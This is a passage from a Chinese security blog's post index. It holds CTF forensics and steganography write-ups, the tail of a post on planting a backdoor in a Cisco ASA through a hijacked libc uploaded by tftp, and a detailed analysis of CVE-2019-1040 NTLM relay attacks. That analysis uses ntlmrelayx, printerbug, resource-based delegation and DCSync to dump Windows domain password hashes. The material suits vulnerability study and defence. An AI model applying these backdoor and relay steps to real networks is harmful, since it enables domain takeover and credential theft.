之所以要编译整个libc库而不单独劫持execv是因为所有的程序都要链接libc库， 编译参数 12export CFLAGS=\"-O2 -U_FORTIFY_SOURCE -march=i686 -mtune=native -fno-stack-protector\"../glibc-2.9/configure --prefix=/root/usr/ --disable-profile --enable-kernel=2.6.26 上传文件测试将我们编译好的so文件和后门上传:12copy tftp://10.1.1.21/libc-2.9-14.so disk0:/lib/libc.so.6copy tftp://10.1.1.21/tshd disk0:/tshd重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了 参考Multiple Vulnerabilities in Cisco ASA SoftwareLD_LIBRARY_PATH considered harmful","link":"/post/e7d26c25.html"},{"title":"SEC-T CTF2018 MISC——batou","text":"使用volatility确定需要使用的配置文件1234567891011121314151617$ volatility -f batou imageinfoVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VMWareAddressSpace (Unnamed AS) AS Layer3 : FileAddressSpace (Documents/SECT-CTF/batou/batou) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800028480a0L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002849d00L KPCR for CPU 1 : 0xfffff880009ea000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2018-09-11 04:17:17 UTC+0000 Image local date and time : 2018-09-10 21:17:17 -0700 12$ volatility -f batou --profile=Win7SP1x64 pstreeVolatility Foundation Volatility Framework 2.6 可以看到notepad.exe正在运行，那么让我们看看它们是否是一些用记事本运行的文件：1volatility -f batou --profile=Win7SP1x64 filescan|grep -ai Notepad 注意0x000000003fe9c930和0x000000003fead410的两个文件1234567$ volatility -f batou --profile=Win7SP1x64 dumpfiles -Q 0x000000003fe9c930 --dump-dir ./Volatility Foundation Volatility Framework 2.6DataSectionObject 0x3fe9c930 None \\Device\\HarddiskVolume2\\Users\\Batou\\AppData\\Roaming\\Notepad++\\backup\\new 2@2018-09-10_203737$ strings file.None.0xfffffa8000da35c0.dat53 4543 54 7b34 6c 6c 5f 79 6f 75 72 5f 4e 30 74 33 73 5f 34 72 33 5f 62 33 6c 30 6e 67 5f 74 30 5f 75 35 使用Python解码得到flag——SECT{4ll_your_N0t3s_4r3_b3l0ng_t0_u5} 1234&gt;&gt;&gt; flag = \"534543547b346c6c5f796f75725f4e307433735f3472335f62336c306e675f74305f7535\"&gt;&gt;&gt; print flag.decode(\"hex\")SECT{4ll_your_N0t3s_4r3_b3l0ng_t0_u5&gt;&gt;&gt;","link":"/post/6e98d489.html"},{"title":"图片隐写信息快速检测工具——zsteg","text":"CTF的图片隐写题中有一种常见的题型——基于LSB原理的图片隐写，而最常用工具就是Stegsolve，但是过程还是有些缓慢和复杂，终于在一次比赛中发现了一个强大的工具——zsteg，这是一个用于检测PNG和BMP中的隐藏数据隐藏数据的工具，可以快速提取隐藏信息，下面就以曾遇到的两个例子说明。 安装Ubuntu中可以使用apt-get命令行工具来安装Ruby和RubyGems，如下所示： 1sudo apt-get install ruby-full rubygems Kali Linux 中则自带了RubyGems。 然后用以下命令安装zsteg后即可使用： 1$ gem install zsteg 对于目标图片，可以分别输入以下命令尝试： 123$ zsteg 你瞅啥.bmp --bits 1 --channel r --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel g --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel b --lsb --order xy --limit 2048 各选项含义如下，还有更多选项可以通过-h选项查看 --bits 1：每次只摘取颜色通道中的第 1 个比特。 --channel r：只摘取红色通道的比特位。 --lsb：按最低有效位优先的顺序进行摘取。 --order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。 --limit 2048：最多摘取输出 2048 字节。 QWB-2019 强⽹先锋-打野当然，上面给出的选项都太过复杂了，而且在这道题中也发现没有有效信息。所以本文重点想介绍的事--all选项，这是一个懒人专属的选项 ，可将所有可能的摘取方法都尝试一遍： 发现没有有效信息，于是使用一个懒人专属的选项 --all，可将所有可能的摘取方法都尝试一遍： 最终在结果中挑选出可能的隐写信息：qwxf{you_say_chick_beautiful?} 网鼎杯-2018 第二场 套娃同样的，2018网鼎杯的一道题也可以用同样的方法做出来：","link":"/post/15753.html"},{"title":"SEC-T CTF2018 MISC——puppetmatryoshka","text":"查看文件类型12$ file matryoshkamatryoshka: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144) 使用wireshark分析可以看到kismet协议的payload全是以BZ开头——即.bz2文件的magic值。 追踪TCP流，将数据保存为.bz2文件 解压后查看文件类型可以看到三个bz2文件解压后都是ext4文件系统，挂载后查看，只有pk2中的2501有内容，其他两个都为空 12345678910$ file pk*pk1: Linux rev 1.0 ext4 filesystem data, UUID=8ee3542a-6867-42e7-9f24-fca7f0a4c63e (extents) (huge files)pk1.bz2: bzip2 compressed data, block size = 900kpk2: Linux rev 1.0 ext4 filesystem data, UUID=b72f5197-d45b-4079-b6e8-b9d1be583d67 (extents) (huge files)pk2.bz2: bzip2 compressed data, block size = 900kpk3: Linux rev 1.0 ext4 filesystem data, UUID=f57d79d5-ca8e-47e2-952f-5c6bd38846ad (extents) (huge files)pk3.bz2: bzip2 compressed data, block size = 900k$ mkdir /mnt/fs &amp;&amp; mount pk2 /mnt/fs$ cd /mnt/fs &amp;&amp; ls2501 lost+found Section6 Section9 解码base64文件继续查看文件2501的类型 123456$ file 25012501: ASCII text$ cat 2501UEsDBBQAAAgAAKKrKE1exjIMJwAAACcAAAAIAAAAbWltZXR5cGVhcHBsaWNhdGlvbi92bmQub2FzaXMub3BlbmRvY3VtZW50LnRleHRQSwMEFAAACAAArJYqTQAAAAAAAAAAAAAAABoAAABDb25maWd1cmF0aW9uczIvcG9wdXBtZW51L1BL......AAAENvbmZpZ3VyYXRpb25zMi9wcm9ncmVzc2Jhci9QSwMEFAAACAAArJYqTQAAAAAAAAAAAAAAABgAAABDb25maWd1sLAACeGQAAHwAAAAAAAAAAAAAAAAC8RgAATUVUQS1JTkYvZG9jdW1lbnRzaWduYXR1cmVzLnhtbFBLBQYAAAAAEwATABUFAAA0UgAAAAA= 可以发现为base64编码的文件，将其解码后再查看类型，为OpenDocument Text格式(.odt)123$ cat 2501 | base64 -d &gt; out.b64$ file out.b64out.b64: OpenDocument Text 这类文档格式大多都是一个压缩文件或多个压缩文件组成（如xps），使用binwalk可以解压：最后得到flag：SECT{Pupp3t_M4st3r_h1d35_1n_Th3_w1r3}123$ binwalk -e out.b64$ cd _out.b64.extracted$ grep -r \"SECT{\"","link":"/post/3cb5449b.html"},{"title":"SEC-T CTF2018 MISC——section6","text":"解压下载的文件section6.tar.gz，得到文件section6，使用file命令查看，可知文件是一个zip文件 12$ file section6section6: Zip archive data, at least v?[0x314] to extract 继续解压，得到如下内容，看着很像一个docx文件解压后的内容： 使用word无法打开这个文件，但经过Google，docx的文档内容保存在Document中，经过一番搜索，终于在section6/Documents/6/Pages/6.fpage中找到了一些可疑的内容，似乎有些像ASCII艺术字， 12345678import rewith open(\"6.fpage\", \"r\") as file: for line in file: found = re.findall(\"UnicodeString\\=\\\"(.+)\\\"\", line) if found: text = found[0] print text 得到flag: SECT{PR0J3KT_2501_15_R43L}","link":"/post/8b74e483.html"},{"title":"结合CVE-2019-1040漏洞的两种Windows域提权利方式","text":"2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。 本文主要介绍了利用该漏洞实现Windows域提权的两种方式。 漏洞复现攻击方式一：利用Exchange测试环境： 角色 系统版本 计算机名 IP地址 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.150 test.local Exchange Windows Server 2012 R2 topsec 192.168.123.143 test.local 测试过程： 环境搭建 安装配置域控制器 安装配置Exchange Server，参考：Exchange Server 2013 一步步安装图解 在域中新建一个用于测试的账户test 执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限。 执行printerbug.py脚本，触发SpoolService的bug。 SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。 接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。 首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示： 该用户组下的成员正是中继的计算机账户TOPSEC 因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）： 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值： 攻击方式二：利用Kerberos委派测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.212 test.local SDC Windows Server 2012 R2 topsec 192.168.123.62 test.local 测试过程： 环境搭建 安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考：Enable LDAP over SSL (LDAPS) for Microsoft Active Directory servers 安装配置辅助域控制器，参考： Windows Server 2012 R2 辅助域控制器搭建 在域中新建一个用于测试的账户topsec，一个域管理员admin 和攻击方式一相同，执行ntlmrelayx.py本，使用–delegate-access选项，将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。 attacker对辅助域控制器(SDC)执行printerbug.py脚本 printerbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。 ntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）, 并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。 使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值： 攻击流程和技术细节以上就是利用CVE-2019-1040进行攻击的两种方式，这里做一下总结： 1、 Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。 2、 Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。 接下来详细介绍整个攻击流程和细节 Exchange攻击流程细节 下文出现的攻击流量图中，各角色与IP对应关系同上文测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.150 test.local Exchange Windows Server 2012 R2 topsec 192.168.123.143 test.local 如果对SMB协议不是很清楚，可以先参考技术点分析-客户端与服务器端的SMB通信一节内容 attacker使用普通AD账户登陆Exchange 在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。 首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。 成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。 触发SpoolService错误 attacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printer bug Exchange主机向Attacker发送Negotiate Protocol Request 在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证 Exchange服务器向Attacker发送Negotiate Protocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信 在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。 Attacker将协商请求通过ldap中继到DC服务器 在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分 attacker向Exchange发送Negotiate Protocol Response Attacker作为中间人，将Negotiate Protocol Request通过ldap请求中继到ad服务器 Exchange向attacker发送Session Setup Request Attacker向DC中继Session Setup Request Attacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker Attacker 向exchange发送Session Setup Response（CHALLENGE） Attacker 将DC发出的包含challenge的Session Setup Response发送给exchange exchange向Attacker发送包含了身份验证请求的Session Setup 我们可以看到下图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$） Attacker向 DC中继含有Exchange的身份认证的Session Setup Request Attacker将身份认证请求中继到DC，并使用Exchange的身份认证通过DC认证，DC认证通过Exchange身份，并向Attcker发送认证通过的Response 此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份，整个流程如下图： 由于安装Exchange后，Exchange在Active Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted Subsystem，该用户组又隶属于Exchange Windows Permissions。Exchange Windows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。 使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步Active Directory中用户的所有哈希密码。 Kerberos委派攻击流程 下文出现的攻击流量图中，各角色与IP对应关系同上文测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.212 test.local SDC Windows Server 2012 R2 topsec 192.168.123.62 test.local Kerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。 在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码 ，如下图 在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤 攻击步骤 攻击者为Service A配置了基于资源的约束委派 由于通过S4U2Self请求到的TGS forwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。 Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据. 通过国外安全研究员Elad Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation， 服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A 可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据. SDC将为admin用户申请的访问Service A的TGS发送给Service A 4、 Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据 5、SDC将为admin用户申请的访问SDC的TGS发送给Service A 在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权 技术点分析在理清利用流程后，接下来详解利用流程中的技术点 客户端与服务器端的SMB通信补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分 SMB2 / Negotiate Protocol Negotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。 Negotiate Protocol命令分为Negotiate Protocol Request/ Negotiate Protocol Response两部分： Negotiate Protocol Request： 客户端向服务器发送第一个SMB请求：“Negotiate Protocol Request”。这个请求包含了客户端所支持的各种 SMB Dialect。 Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。 SMB2 / Session Setup SMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。 Session Setup分为两部分： Session Setup Request: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。 Session Setup Response: 服务器回复是否通过验证。 SpoolService/printer bug在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。 Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。 任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。 在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。 下图是printerbug.py执行后的数据包： 第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test； 接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。 第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证） SMB中继LDAP思路以及难点在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下： 1、 默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态 2、 将此SMB流量中继到LDAP时，由于此时的Negotiate Sign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败 3、 为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set 4、 MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过 5、 需要寻找一种可以绕过MIC校验的方式，以便更改包中的值 6、 在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP MIC校验NTLM身份验证由3种消息类型组成： NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。 NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段 Clinet与Server交互流程图 为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。 MIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。 因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。 MIC校验绕过Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。 如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤： 取消MIC校验以确保可以修改数据包中的内容： 从NTLM_AUTHENTICATE消息中删除MIC 从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。 LDAP签名绕过在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验 将NEGOTIATE_SIGN设置为not set以绕过LDAP验证 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。 smb中继LDAP流程为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继 Ntlmrelayx中继流程如下： 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN） 可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN） 从NTLM_AUTHENTICATE消息中删除MIC以及版本字段 在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION 在通过LDAP中继时， NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’ 参考链接[1] Exchange Server 2013 一步步安装图解 [2] Enable LDAP over SSL (LDAPS) for Microsoft Active Directory servers [3] Windows Server 2012 R2 辅助域控制器搭建 [4] 滥用基于资源约束委派来攻击Active Directory [5] Abusing S4U2Self: Another Sneaky Active Directory Persistence [6] 利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞 [7] 滥用Exchange：远离域管理员的一个API调用 [8] The SYSTEM Account [9] Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory","link":"/post/ee2ffad8.html"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Canary","slug":"Canary","link":"/tags/Canary/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"Photo","slug":"Photo","link":"/tags/Photo/"},{"name":"Photography","slug":"Photography","link":"/tags/Photography/"},{"name":"摄影","slug":"摄影","link":"/tags/%E6%91%84%E5%BD%B1/"},{"name":"MISC","slug":"MISC","link":"/tags/MISC/"},{"name":"Fornesics","slug":"Fornesics","link":"/tags/Fornesics/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"漏洞","slug":"漏洞","link":"/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"NTML","slug":"NTML","link":"/tags/NTML/"},{"name":"提权","slug":"提权","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"Binary","slug":"Binary","link":"/tags/Binary/"},{"name":"Reverse","slug":"Reverse","link":"/tags/Reverse/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","link":"/tags/Symbolic-Execution/"},{"name":"fuzzing","slug":"fuzzing","link":"/tags/fuzzing/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"Heap Spray","slug":"Heap-Spray","link":"/tags/Heap-Spray/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"ghostscrpt","slug":"ghostscrpt","link":"/tags/ghostscrpt/"},{"name":"Fortigate","slug":"Fortigate","link":"/tags/Fortigate/"},{"name":"网络设备","slug":"网络设备","link":"/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/"},{"name":"Mac","slug":"Mac","link":"/tags/Mac/"},{"name":"Hackintosh","slug":"Hackintosh","link":"/tags/Hackintosh/"},{"name":"黑苹果","slug":"黑苹果","link":"/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/"},{"name":"杂项","slug":"杂项","link":"/tags/%E6%9D%82%E9%A1%B9/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Cisco","slug":"Cisco","link":"/tags/Cisco/"},{"name":"Steganalysis","slug":"Steganalysis","link":"/tags/Steganalysis/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"杂文","slug":"杂文","link":"/categories/%E6%9D%82%E6%96%87/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"Fuzzing","slug":"Fuzzing","link":"/categories/Fuzzing/"},{"name":"Hackintosh","slug":"Hackintosh","link":"/categories/Hackintosh/"}]}